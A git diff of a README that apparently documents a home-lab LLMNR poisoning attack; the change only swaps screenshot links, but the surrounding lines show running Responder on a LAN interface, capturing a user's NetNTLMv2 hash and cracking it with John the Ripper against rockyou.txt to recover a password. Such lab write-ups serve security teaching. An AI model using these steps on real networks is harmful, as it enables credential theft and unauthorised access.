@@ -31,7 +31,7 @@ responder -I eth0 -v
 # since there is no "unknown-folder" located on this domain, the machine will send a multicast request to all devices on the LAN.
 ```
 #### Step 3: Save hash to .txt file
-![hash - Copy](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/32943fb9-3391-4f00-b2f0-a8058779f30c)
+![hash - Copy](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/c33dd140-0c05-4489-a50f-5462de09a0a7)
 
 - Highlight and copy the entire hash starting at "mscott::MYDOMAIN:
   - Open new terminal tab.
@@ -56,7 +56,7 @@ john --wordlist=usr/share/wordlists/rockyou.txt --format=netntlmv2 (.txt your ma
 # runs the hash .txt file against the rockyou.txt wordlist
 ```
 
-![ashw](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/a9ae155c-c880-42d2-9bb4-472c70369035)
+![ashw](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/cb2701aa-0865-4598-aa0a-4ff0aaecf258)
 - We see our Windows client login credentials.
   -  Pass: Password1 | username: mscott
 
